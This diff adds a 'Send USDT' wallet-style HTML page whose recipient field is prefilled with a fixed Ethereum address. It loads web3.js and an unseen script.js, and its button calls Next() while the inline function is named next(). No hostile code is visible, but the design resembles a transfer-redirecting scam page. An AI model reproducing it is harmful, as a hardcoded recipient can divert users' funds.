@@ -1,0 +1,148 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0d0d0d;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #ccc;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      background-color: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      flex: 1;
+      background-color: transparent;
+      border: none;
+      color: white;
+      outline: none;
+      font-size: 16px;
+    }
+
+    .input-group button {
+      margin-left: 10px;
+      background-color: transparent;
+      color: #00ff99;
+      border: none;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .usd-value {
+      margin-top: -10px;
+      margin-bottom: 20px;
+      color: #999;
+    }
+
+    .next-button {
+      width: 100%;
+      background-color: #00cc66;
+      color: white;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+    }
+
+    .icon {
+      width: 18px;
+      height: 18px;
+      fill: #00ff99;
+      vertical-align: middle;
+    }
+
+    .input-group svg {
+      margin-left: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <label for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" value="0xa857a4E4B3f7C0eb7e132A7A4abcA287225dDB2A" />
+      <button onclick="pasteAddress()">Paste</button>
+      <svg class="icon" viewBox="0 0 24 24">
+        <path d="M3 3h6v2H5v14h14v-4h2v6H3V3zm18-1v8h-8V2h8zm-2 2h-4v4h4V4zm-8 6h10v2H11v-2zm0 4h10v2H11v-2zm0 4h6v2h-6v-2z"/>
+      </svg>
+    </div>
+
+    <label for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()" />
+      <span style="margin-left: 10px;">USDT</span>
+      <button onclick="setMax()">Max</button>
+    </div>
+
+    <div class="usd-value" id="usdValue">≈ $0.00</div>
+
+    <button id="Next" class="next-button" onclick="Next()">Next</button>
+  </div>
+
+  <script>
+    function pasteAddress() {
+      navigator.clipboard.readText().then((text) => {
+        document.getElementById('address').value = text;
+      });
+    }
+
+    function setMax() {
+      const maxAmount = 100; // Change as needed
+      document.getElementById("amount").value = maxAmount;
+      updateUSD();
+    }
+
+    function updateUSD() {
+      const amount = parseFloat(document.getElementById("amount").value || "0");
+      const usdValue = amount * 1; // USDT assumed 1:1
+      document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
+    }
+
+    function next() {
+      const address = document.getElementById("address").value;
+      const amount = parseFloat(document.getElementById("amount").value);
+
+      if (!address || isNaN(amount) || amount <= 0) {
+        alert("Please fill in both a valid address and amount greater than 0.");
+        return;
+      }
+
+      // You can redirect or handle form here
+      console.log("Sending to:", address, "Amount:", amount);
+    }
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
